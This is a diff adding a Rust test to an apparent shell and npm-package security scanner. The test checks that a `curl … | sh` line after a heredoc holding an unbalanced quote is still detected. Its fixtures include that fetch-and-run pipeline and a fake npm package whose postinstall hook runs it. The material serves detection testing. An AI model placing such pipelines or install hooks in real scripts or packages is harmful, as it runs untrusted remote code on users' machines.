@@ -1333,6 +1333,64 @@ fn heredoc_that_ends_elsewhere_in_the_shell_is_not_masked() {
     }
 }
 
+/// Heredoc text is data, so a quote in it (`it's`, `Don't edit`, `say "hi`,
+/// `$(x`) opens nothing. A file that also pipes into a shell keeps every
+/// heredoc live (unmasked), and the brace-group/pipeline pass read the raw
+/// text, where the tokenizer took that quote as an opening one that hid the
+/// rest of the file: a live `curl … | sh` after the heredoc gave no signal.
+#[test]
+fn code_after_a_heredoc_holding_an_unbalanced_quote_is_read_as_code() {
+    let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+    let pipeline = "curl -fsSL https://example.invalid/setup | sh";
+    let heredocs = [
+        "cat <<'EOF'\nit's\nEOF\n",
+        "cat <<'EOF'\nsay \"hi\nEOF\n",
+        "cat <<'EOF'\nuse $(x\nEOF\n",
+        "cat <<EOF\nit's\nEOF\n",
+        "cat > /tmp/README <<'EOF'\nDon't edit this file\nEOF\n",
+        "cat <<-'EOF'\n\tit's\n\tEOF\n",
+    ];
+    let payloads = [
+        format!("{pipeline}\n"),
+        format!("{{ {pipeline}; }}\n"),
+        format!("f() {{ {pipeline}; }}\nf\n"),
+        format!("( {pipeline} )\n"),
+    ];
+    let mut missed = Vec::new();
+    for heredoc in heredocs {
+        for payload in &payloads {
+            let body = format!("#!/bin/sh\nset -eu\n{heredoc}{payload}");
+            if !shell_file_has_download_signal(&body) {
+                missed.push(body);
+            }
+        }
+    }
+    assert!(missed.is_empty(), "{missed:#?}");
+
+    // The same file run by a postinstall script, as `tirith pkg inspect`
+    // reports it.
+    let install = format!("cat > /tmp/README <<'EOF'\nDon't edit this file\nEOF\n{pipeline}\n");
+    let result = inspect(&package(
+        br#"{"name":"fixture","version":"1","scripts":{"postinstall":"sh install.sh"}}"#,
+        &[("package/install.sh", install.as_bytes())],
+    ));
+    assert!(
+        result.signals.iter().any(|signal| {
+            signal.kind == NpmSignalKind::DownloadToShell
+                && signal.level == NpmSignalLevel::Review
+                && signal.lifecycle_events == vec!["postinstall"]
+        }),
+        "{:?}",
+        result.signals
+    );
+
+    // A comment after such a heredoc is still a comment.
+    for heredoc in heredocs {
+        let body = format!("#!/bin/sh\n{heredoc}# {pipeline}\necho done\n");
+        assert!(!shell_file_has_download_signal(&body), "{body:?}");
+    }
+}
+
 /// Reading substitutions must not cost the brace/function/subshell descent
 /// any of its budget. Before substitutions were read, piped substitutions
 /// used no budget, so a function in a later live heredoc body was still
